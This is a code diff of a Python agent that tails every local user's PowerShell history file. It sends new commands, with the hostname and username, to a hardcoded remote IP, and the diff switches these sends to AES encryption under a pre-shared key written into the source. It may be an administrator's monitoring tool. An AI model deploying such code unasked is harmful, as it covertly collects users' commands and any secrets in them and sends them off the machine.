@@ -10,9 +10,9 @@ import socket
 import getpass
 import base64
 import json
-# from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-# from cryptography.hazmat.primitives import padding
-# from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import padding
+from cryptography.hazmat.backends import default_backend
 # import difflib
 # add 
 # certin powershell history settings 
@@ -20,7 +20,8 @@ import json
 URL = "http://100.95.68.26:5000"
 hostname = socket.gethostname()
 username = getpass.getuser()
-# PSK = "0feNcM1h9Cx2mWAopX6Rq8WZ9sHUvQG4TthfgCL2lk0="
+#example PSK
+PSK = "0feNcM1h9Cx2mWAopX6Rq8WZ9sHUvQG4TthfgCL2lk0="
 
 
 
@@ -28,22 +29,22 @@ class FileChecking(FileSystemEventHandler):
     def __init__(self):
         # print("init")
         super()
-        path_result = subprocess.run("powershell.exe (Get-PSReadlineOption).HistorySavePath", shell=True, capture_output=True).stdout.decode('utf-8').strip()
+        # path_result = subprocess.run("powershell.exe (Get-PSReadlineOption).HistorySavePath", shell=True, capture_output=True).stdout.decode('utf-8').strip()
         # raw_path = repr(path_result)[1:-1]
-        path_as_list = path_result.split("\\")
-        dir = "\\".join(path_as_list[0:-1])
+        # path_as_list = path_result.split("\\")
+        # dir = "\\".join(path_as_list[0:-1])
         # print(dir)
         # print(path_result.split("\\"))
         # print(raw_path)
         # self.static_path = os.path.normpath(r"C:\Users\ericd\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt")
-        self.static_path = path_result
+        # self.static_path = path_result
         # print(self.static_path) 
         # self.static_dir = os.path.normpath(r"C:\Users\ericd\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine")
-        self.static_dir = dir
+        # self.static_dir = dir
         self.content = ""
         # self.pos = None
-        with open(self.static_path,"r", encoding="utf-8",errors="replace") as ps_con_history:
-            self.content = ps_con_history.readlines()
+        # with open(self.static_path,"r", encoding="utf-8",errors="replace") as ps_con_history:
+        #     self.content = ps_con_history.readlines()
             # ps_con_history.seek(0,2)
             # self.pos = ps_con_history.tell()
             # self.content = set()
@@ -52,7 +53,16 @@ class FileChecking(FileSystemEventHandler):
         self.history_paths = get_history_paths()
         print(self.history_paths)
         self.history_files = {}
+        self.file_positions = {}
         for path in self.history_paths:
+
+            try:
+                self.file_positions[path]= os.path.getsize(path)
+                # print(self.file_positions[path])
+            except Exception as e:
+                print(f"* Error getting size for {path}: {e}")
+                self.file_positions[path]=0
+
             with open(path,"r", encoding="utf-8",errors="replace") as user_con_history:
                 self.history_files[path] = user_con_history.readlines()
 
@@ -67,32 +77,59 @@ class FileChecking(FileSystemEventHandler):
         if norm_path in self.history_paths:
             time.sleep(0.1)
             try:
-                with open(norm_path,"r", encoding="utf-8",errors="replace") as user_con_history:
-                    current_content = user_con_history.readlines()
-                    # print(f"current content {current_content}")
-                    prev_content = self.history_files[norm_path]
-                    # print(f"prev content: {prev_content}")
-                    #this could be more efficent especially if the history file is large
-                    # diff = list((Counter(current_content)-Counter(self.content)).elements())#think about what happens if the log file is full
-                    diff = list((Counter(current_content)-Counter(prev_content)).elements())
-                    self.history_files[norm_path] = current_content
-
-                    # ps_con_history.seek(self.pos)
-                    # print(str(ps_con_history.readlines())[2:-4].strip())
-                    # ps_con_history.seek(0,2)
-                    # self.pos = ps_con_history.tell()
+                prev_pos= self.file_positions.get(norm_path,0)
+                current_size = os.path.getsize(norm_path) 
+                if current_size > prev_pos:
                     
-                    command = str(diff)[2:-4].strip()
-                    if command:
-                        # username = getpass.getuser()
-                        username = str(norm_path.split("\\")[2])
-                        print(username)
-                        json = {"command":command,"hostname":hostname, "username":username}
-                        endpoint = "log"
-                        post_log(endpoint, json)
-                        print(str(diff)[2:-4].strip())
-            except PermissionError:
+                    with open(norm_path,"r", encoding="utf-8",errors="replace") as user_con_history:
+                        # current_content = user_con_history.readlines()
+                        # print(f"current content {current_content}")
+                        # prev_content = self.history_files[norm_path]
+                        # print(f"prev content: {prev_content}")
+                        #this could be more efficent especially if the history file is large
+                        # diff = list((Counter(current_content)-Counter(self.content)).elements())#think about what happens if the log file is full
+                        # diff = list((Counter(current_content)-Counter(prev_content)).elements())
+                        # self.history_files[norm_path] = current_content
+
+                        # ps_con_history.seek(self.pos)
+                        # print(str(ps_con_history.readlines())[2:-4].strip())
+                        # ps_con_history.seek(0,2)
+                        # self.pos = ps_con_history.tell()
+                        user_con_history.seek(prev_pos)
+                        new_data = user_con_history.read()
+                        self.file_positions[norm_path] = user_con_history.tell()
+                        # command = str(diff)[2:-4].strip()
+
+                        # cleaned_commands = [cmd.strip() for cmd in diff if cmd.strip()]
+                        # command = "\n".join(cleaned_commands)
+
+                        # if command:
+                        #     # username = getpass.getuser()
+                        #     username = str(norm_path.split("\\")[2])
+                        #     print(username)
+                        #     json_payload = {"command":command,"hostname":hostname, "username":username}
+                        #     endpoint = "log"
+                            # post_log(endpoint, json_payload)
+                            # print(str(diff)[2:-4].strip())
+                        diff = [line.strip() for line in new_data.splitlines() if line.strip()]
+                        # command = "\n".join(cleaned_commands)
+                        # for command in diff:
+                        if diff:#doesn't do that much after testing
+                            batched_cmds = "\n".join(diff)
+
+                            username = str(norm_path.split("\\")[2])
+                            # print(f"Command from {username}: {command}")
+                            json_payload = {"command": batched_cmds, "hostname": hostname, "username": username}
+                            endpoint = "log"
+                            post_log(endpoint, json_payload)
+                elif current_size < prev_pos:
+                    # Handle Edge Case: If the history file is cleared, reset tracking to 0
+                    print(f"[*] History file truncated or cleared for {norm_path}. Resetting position.")
+                    self.file_positions[norm_path] = current_size
+            except PermissionError: 
                 print("skipping as file is likley locked")
+            except Exception as e:
+                print(f"[-] Unexpected error tracking file changes: {e}")
 
 def get_history_paths(is_dir=False):
     # cmd = "powershell -Command \"Get-LocalUser | Select-Object -ExpandProperty Name\""
@@ -134,10 +171,10 @@ def get_history_paths(is_dir=False):
 
 def post_log(endpoint, payload):
     try:
-        # encrypted_string = encrypt_payload(payload)#will need to format the object
-        # encrypted_payload = {"d":encrypted_string}
-        r = requests.post(f"{URL}/{endpoint}", json=payload, timeout=5)
-        # r = requests.post(f"{URL}/{endpoint}", json=encrypted_payload, timeout=5)
+        encrypted_string = encrypt_payload(payload)#will need to format the object
+        encrypted_payload = {"d":encrypted_string}
+        # r = requests.post(f"{URL}/{endpoint}", json=payload, timeout=5)
+        r = requests.post(f"{URL}/{endpoint}", json=encrypted_payload, timeout=5)
 
         # r= requests.post(f"{URL}/{endpoint}", json=encrypt_payload(payload), timeout=5)
         # print(response)
@@ -146,24 +183,24 @@ def post_log(endpoint, payload):
         return r.text
     except Exception as e:
         print(f"Error: {e}")
+#should move these to seprate files eventually, will lead to changes in playbook and maybe structure
+def _get_key() -> bytes:
+    return base64.b64decode(PSK)
 
-# def _get_key() -> bytes:
-#     return base64.b64decode(PSK)
+def encrypt_payload(data: dict) -> str:
 
-# def encrypt_payload(data: dict) -> str:
+    plaintext = json.dumps(data).encode("utf-8")
 
-#     plaintext = json.dumps(data).encode("utf-8")
+    # PKCS7 padding
+    padder = padding.PKCS7(128).padder()
+    padded = padder.update(plaintext) + padder.finalize()
 
-#     # PKCS7 padding
-#     padder = padding.PKCS7(128).padder()
-#     padded = padder.update(plaintext) + padder.finalize()
+    iv = os.urandom(16)
+    cipher = Cipher(algorithms.AES(_get_key()), modes.CBC(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+    ciphertext = encryptor.update(padded) + encryptor.finalize()
 
-#     iv = os.urandom(16)
-#     cipher = Cipher(algorithms.AES(_get_key()), modes.CBC(iv), backend=default_backend())
-#     encryptor = cipher.encryptor()
-#     ciphertext = encryptor.update(padded) + encryptor.finalize()
-
-#     return base64.b64encode(iv + ciphertext).decode("ascii")
+    return base64.b64encode(iv + ciphertext).decode("ascii")
 
 def main():
     # print(get_history_paths())
